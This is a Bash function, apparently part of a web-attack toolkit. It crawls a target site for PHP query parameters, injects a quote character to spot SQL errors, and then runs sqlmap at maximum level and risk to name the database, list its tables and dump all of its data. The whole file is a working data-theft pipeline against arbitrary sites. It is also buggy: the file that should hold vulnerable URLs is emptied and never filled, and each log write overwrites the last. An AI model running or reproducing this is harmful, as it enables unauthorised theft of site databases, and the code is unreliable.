# ================================================
# __FUNC_CHECK_SQL - Scan and test for SQL injection vulnerabilities
# ================================================
# - Fetches URLs with `.php` and query parameters from the target website using `curl`
# - Tests each parameter for SQL injection vulnerabilities by injecting a basic payload (`'`)
# - Logs and reports vulnerable URLs based on common SQL error responses in the page content
# - Runs SQLMap against any identified vulnerable URLs to perform further SQL enumeration
# - Identifies the current database and lists tables, then dumps all data from the database
# - Estimates the size of the dumped data and saves the findings in a report
# ================================================

__FUNC_CHECK_SQL() {

    # Files
    SQLMAP_FILE="${TXT_DIR}/${DOMAIN}-sqlmap.txt"
    SQLMAP_LOG_FILE="${TXT_DIR}/${DOMAIN}-sqlmap-log.txt"
    SQLMAP_DUMP_LOG_FILE="${TXT_DIR}/${DOMAIN}-sqlmap-dump.log"
    SQLMAP_DBLOG_FILE="${TXT_DIR}/${DOMAIN}-sqlmap-db.txt"

    # Print info message about collecting URLs from the target
    print_info "${SQL_COLLECTING_URLS} ${TARGET_URL}..."

    # Use curl to fetch HTML content, then extract .php URLs with GET parameters
    GET_PHP=$(${CURL} -sLk \
        -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -H "Accept-Language: en-US,en;q=0.9" \
        -H "Connection: keep-alive" "${TARGET_URL}" \
        | grep -oE 'href=["'"'"'][^"'"'"']+\.php\?[^"'"'"']+' \
        | sed -E 's/^href=["'"'"']//' \
        | sed -E 's/["'"'"']$//' \
        | grep -iE '\.php\?[a-z0-9_]+=.*' \
        | sed -E 's|^https?://[^/]+||' \
        | sed -E 's|^/||' \
        | sort -u)

    # If no URLs were found, show error and exit the function
    if [[ -z "${GET_PHP}" ]]; then
        print_error "${SQL_NO_URLS_FOUND} ${TARGET_URL}"
        return
    fi

    # Display the found URLs
    print_success "${SQL_FOUND_URLS}"
    echo "${GET_PHP}"

    echo ">>> ${SQL_TESTING_PAYLOADS}"

    # Define SQL payload to test
    SQL_PAYLOAD="'"
    # Prepare output files
    > "${SQLMAP_FILE}"
    > "${SQLMAP_LOG_FILE}"

    # Loop through each found .php endpoint
    while IFS= read -r ENDPOINT; do
        BASE_PATH=$(echo "${ENDPOINT}" | cut -d'?' -f1)
        QUERY=$(echo "${ENDPOINT}" | cut -s -d'?' -f2)
        [[ -z "${QUERY}" ]] && continue

        # Split parameters
        IFS='&' read -ra PARAMS <<< "${QUERY}"

        # Test each parameter by injecting SQL payload
        for PARAM in "${PARAMS[@]}"; do
            KEY=$(echo "${PARAM}" | cut -d'=' -f1)
            TEST_QUERY=""
            for K in "${PARAMS[@]}"; do
                P_KEY=$(echo "${K}" | cut -d'=' -f1)
                if [[ "${P_KEY}" == "${KEY}" ]]; then
                    TEST_QUERY+="${P_KEY}=${SQL_PAYLOAD}&"
                else
                    TEST_QUERY+="${K}&"
                fi
            done

            TEST_QUERY="${TEST_QUERY%&}"
            URL="${TARGET_URL%/}/${BASE_PATH}?${TEST_QUERY}"

            # Notify user of URL being tested
            print_warning "${SQL_TESTING_URL} ${URL}"
            RESPONSE=$(${CURL} -sk --max-time 7 "${URL}")

            {
                line
                echo "${SQL_CHECK_INJECT_RESULT} ${URL}"
                line

                # Check for typical SQL error keywords in the response
                if echo "${RESPONSE}" | grep -qiE "sql|syntax|mysql|mysqli|error|exception|PDO|ODBC|ORA|DB2|Warning"; then
                    print_success "${SQL_VULNERABLE_URL} ${URL}"
                else
                    echo "${URL} ${SQL_URL_NOT_VULNERABLE}"
                fi

                separator
                echo "${DATE}"
                line

            } | tee "${SQLMAP_LOG_FILE}"

            separator
            print_bg "###### ${FINISHED}: ${SQL_CHECK_INJECT_RESULT}"
            separator

            print_success "${SAVED_RESULT} ${SQLMAP_LOG_FILE}"
            createFile "sqlmap-log" "${SQL_CHECK_INJECT_RESULT} - ${DOMAIN}"

        done
    done <<< "${GET_PHP}"

    echo ""
    echo ">>> ${SQL_STARTING_SQLMAP}"

    # Start SQLMap against vulnerable URLs found
    while IFS= read -r VULN_URL; do
        print_warning "${SQL_RUNNING_SQLMAP} ${VULN_URL}"
        print_info "${SQL_RUNNING_SQLMAP_INFO}"

        > "${SQLMAP_DUMP_LOG_FILE}"

        # Run SQLMap to identify the current database
        sqlmap -u "${VULN_URL}" \
            --batch \
            --current-db \
            --threads=${SQLMAP_THREADS} \
            --timeout=${SQLMAP_TIMEOUT} \
            --retries=${SQLMAP_RETRIES} \
            --delay=${SQLMAP_DELAY} \
            --random-agent \
            --level=5 \
            --risk=3 \
            2>&1 | tee -a "${SQLMAP_DUMP_LOG_FILE}"

        DOMAINDB=$(grep 'current database:' "${SQLMAP_DUMP_LOG_FILE}" | awk -F: '{print $2}' | sed "s/'//g" | xargs)

        if [[ -n "${DOMAINDB}" ]]; then
            print_success "${SQL_DB_IDENTIFIED} ${DOMAINDB}"
        else
            print_error "${SQL_DB_NOT_IDENTIFIED}"
            continue
        fi

        # List all tables in the discovered database
        print_warning "${SQL_LISTING_TABLES} ${DOMAINDB}"

        sqlmap -u "${VULN_URL}" \
            --batch \
            --threads=${SQLMAP_THREADS} \
            --timeout=${SQLMAP_TIMEOUT} \
            --retries=${SQLMAP_RETRIES} \
            --delay=${SQLMAP_DELAY} \
            --random-agent \
            --level=5 \
            --risk=3 \
            -D "${DOMAINDB}" --tables 2>&1 | tee -a "${SQLMAP_DUMP_LOG_FILE}"

        DOMAINTABLE=$(grep -iE "Table:|Name:" "${SQLMAP_DUMP_LOG_FILE}" | awk -F':' '/Table:/ {print $2}' | tr -d '[:space:]')

        if [[ -n "${DOMAINTABLE}" ]]; then
            print_success "${SQL_TABLES_FOUND}"
            echo "${DOMAINTABLE}"
        else
            print_error "${SQL_NO_TABLES_FOUND}"
        fi

        # Dump all data from the identified database
        print_warning "${SQL_DUMPING_DB} ${DOMAINDB}"

        sqlmap -u "${VULN_URL}" \
            --batch \
            --timeout=${SQLMAP_TIMEOUT} \
            --retries=${SQLMAP_RETRIES} \
            --delay=${SQLMAP_DELAY} \
            --random-agent \
            --level=5 \
            --risk=3 \
            -D "${DOMAINDB}" --dump-all 2>&1 | tee -a "${SQLMAP_DUMP_LOG_FILE}"

        # Try to estimate the dump size
        DUMP_SIZE=$(grep -iE "\[INFO\] fetched data.*bytes" "${SQLMAP_DUMP_LOG_FILE}" | tail -n1 | grep -oE '[0-9]+ bytes' || echo "Desconhecido")

        print_success "${SQL_DUMP_DONE}"
        echo "${SQL_DB_NAME} ${DOMAINDB}"
        echo "${SQL_DB_ESTIMATED_SIZE} ${DUMP_SIZE}"
        echo "${SQL_DB_TECHNOLOGY} mysql"

        # Save all gathered info to a final report file
        {
            echo "${SQL_DATABASE}: ${DOMAINDB}"
            echo "${SQL_TABLES}: ${DOMAINTABLE}"
            echo "${SQL_SIZE}: ${DUMP_SIZE}"
            echo "${SQL_TEC}: mysql"
            echo ""
        } >> "${SQLMAP_DBLOG_FILE}"

    done < "${SQLMAP_FILE}"

    echo "${SQL_FINISH_EXECUTION} ${SQLMAP_DBLOG_FILE}"
}